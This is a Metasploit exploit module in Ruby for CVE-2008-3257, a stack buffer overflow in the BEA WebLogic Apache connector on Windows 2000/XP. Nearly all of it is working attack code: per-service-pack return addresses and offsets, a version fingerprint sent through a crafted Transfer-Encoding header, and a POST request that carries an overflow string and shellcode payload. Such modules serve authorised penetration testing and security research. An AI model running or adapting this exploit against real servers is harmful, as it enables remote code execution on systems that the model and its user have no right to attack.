##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	HttpFingerprint = { :pattern => [ /Apache/ ] }

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Oracle Weblogic Apache Connector POST Request Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack based buffer overflow in the BEA
				Weblogic Apache plugin.

				The connector fails to properly handle specially crafted HTTP POST
				requests, resulting a buffer overflow due to the insecure usage
				of sprintf.  Currently, this module works over Windows systems without DEP,
				and has been tested with Windows 2000 / XP.

				In addition, the Weblogic Apache plugin version is fingerprinted with a POST
				request containing a specially crafted Transfer-Encoding header.
			},
			'Author'         =>
				[
					'KingCope', # Vulnerability Discovery and PoC
					'juan vazquez', # Metasploit Module
				],
			'Version'        => '$Revision: $',
			'References'     =>
				[
					[ 'CVE', '2008-3257' ],
					[ 'OSVDB', '47096' ],
					[ 'BID', '30273' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Privileged'     => true,
			'Platform'       => 'win',
			'Payload'        =>
				{
					'Space'    => 4000,
					'BadChars' => "\x00\x0d\x0a\x3f"
				},
			'Targets'        =>
				[
					[ 'Automatic', {} ],
					[  'BEA WebLogic 8.1 SP6 - mod_wl_20.so / Apache 2.0 / Windows [XP/2000]',
						{
							'Ret' => 0x10061f63, # push esp # ret # mod_wl_20.so
							'Offset' =>  4102
						}
					],
					[  'BEA WebLogic 8.1 SP5 - mod_wl_20.so / Apache 2.0 / Windows [XP/2000]',
						{
							'Ret' => 0x10061473, # push esp # ret # mod_wl_20.so
							'Offset' =>  4102
						}
					],
					[  'BEA WebLogic 8.1 SP4 - mod_wl_20.so / Apache 2.0 / Windows [XP/2000]',
						{
							'Ret' => 0x10020e31, # push esp # ret # mod_wl_20.so
							'Offset' =>  4102
						}
					]
				],
			'DisclosureDate' => 'Jul 17 2008',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('TARGETURI', [true, 'The URI path to a jsp or object provided by Weblogic', '/index.jsp']),
			], self.class)

	end


	def check

		fingerprint = fingerprint_mod_wl

		case fingerprint
		when /Version found/
			return Exploit::CheckCode::Vulnerable
		when /BEA WebLogic connector vulnerable/
			return Exploit::CheckCode::Appears
		when /BEA WebLogic connector undefined/
			return Exploit::CheckCode::Detected
		when /BEA WebLogic connector no vulnerable/, /BEA WebLogic connector not found/
			return Exploit::CheckCode::Safe
		end

	end

	def exploit

		# Autodetect BEA mod_wl version
		my_target = get_target

		# Avoid the attack if the victim doesn't have the same setup we're targeting
		if my_target.nil?
			print_error("BEA mod_weblogic not supported")
			return
		end

		uri = target_uri.path
		sploit = rand_text_alphanumeric(my_target['Offset']-uri.length)
		sploit << [my_target.ret].pack("V")
		sploit << payload.encoded

		send_request_cgi({
			'method'  => 'POST',
			'uri'     => "#{uri} #{sploit}",
		})

		handler

	end

	def get_target

		return target if target.name != 'Automatic'

		fingerprint = fingerprint_mod_wl

		case fingerprint
		when /BEA WebLogic 8.1 SP6 - mod_wl_20.so/
			return targets[1]
		when /BEA WebLogic 8.1 SP5 - mod_wl_20.so/
			return targets[2]
		when /BEA WebLogic 8.1 SP4 - mod_wl_20.so/
			return targets[3]
		else
			return nil
		end

	end

	def fingerprint_mod_wl

		my_data = rand_text_alpha(rand(5) + 8)
		res = send_request_cgi(
				{
					'method'  => 'POST',
					'uri'     => target_uri.path,
					'headers' =>
						{
							'Transfer-Encoding' => my_data
						},
					'data' => "#{my_data.length}\r\n#{my_data}\r\n0\r\n",
				})

		if res and res.code == 200 and res.body =~ /Weblogic Bridge Message/
			# BEA WebLogic 8.1 SP6 - mod_wl_20.so
			case res.body
			when (/Build date\/time:<\/B> <I>Jun 16 2006 15:14:11/ and /Change Number:<\/B> <I>779586/)
				return "Version found: BEA WebLogic 8.1 SP6 - mod_wl_20.so"
			# BEA WebLogic 8.1 SP5 - mod_wl_20.so
			when (/Build date\/time:<\/B> <I>Aug  5 2005 11:19:57/ and /Change Number:<\/B> <I>616810/)
				return "Version found: BEA WebLogic 8.1 SP5 - mod_wl_20.so"
			when (/Build date\/time:<\/B> <I>Oct 25 2004 09:25:23/ and /Change Number:<\/B> <I>452998/)
				return "Version found: BEA WebLogic 8.1 SP4 - mod_wl_20.so"
			# Check for dates prior to patch release
			when /([A-Za-z]{3} [\s\d]{2} [\d]{4})/
				build_date = Date.parse($1)
				if build_date <= Date.parse("Jul 28 2008")
					return "BEA WebLogic connector vulnerable"
				else
					return "BEA WebLogic connector no vulnerable"
				end
			else
				return "BEA WebLogic connector undefined"
			end
		end

		return "BEA WebLogic connector not found"

	end

end
